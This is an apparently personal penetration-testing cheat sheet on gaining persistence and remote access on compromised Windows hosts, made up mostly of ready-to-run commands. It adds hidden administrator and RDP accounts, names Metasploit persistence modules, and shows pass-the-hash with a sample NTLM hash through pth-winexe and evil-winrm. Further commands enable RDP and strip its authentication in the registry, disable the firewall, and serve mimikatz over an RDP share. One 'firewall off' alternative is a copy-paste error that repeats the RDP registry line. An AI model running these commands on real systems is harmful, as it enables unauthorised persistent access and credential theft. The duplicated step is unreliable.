 # Windows Persistence 
 Methods: service, registry keys, startup folders, scheduled tasks, WMI permanent events.
 
     net user USERNAME PASSWORD /add
     net localgroup Administrators USERNAME /add
     net localgroup "Remote Management Users" USERNAME /add    
     
 Metasploit Modules:  
 
     exploit/windows/local/persistence_service   #to add a service    
     exploit/windows/local/wmi_persistence       #wmi event subscription, triggered with logon failures (event ID 4625)   
____ 
## Access        

### Persistence Methods   
https://persistence-info.github.io/   

### Pass the Hash      

    pth-winexe //192.168.149.10 -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e cmd   
    evil-winrm -u Administrator -H ADMIN_HASH -i IP      #using evil-winrm   
### WinRM
 Enabled WinRm as Administrator to use evil-winrm. -H to pass the hash
 
     WinRM quickconfig       
 
### Enabling RDP  
Add a user with RDP / admin privs 

    net user evil 3v1lPass /add
    net localgroup Administrators evil /add
    net localgroup "Remote Desktop Users" evil /ADD

Enable RDP 

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Turn firewall off

    netsh firewall set opmode disable
    or
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:
"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.""
Add this reg key:

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f   
RDP with a shared folder    

     xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share \\tsclient\share\mimikatz\x64\mimikatz.exe   
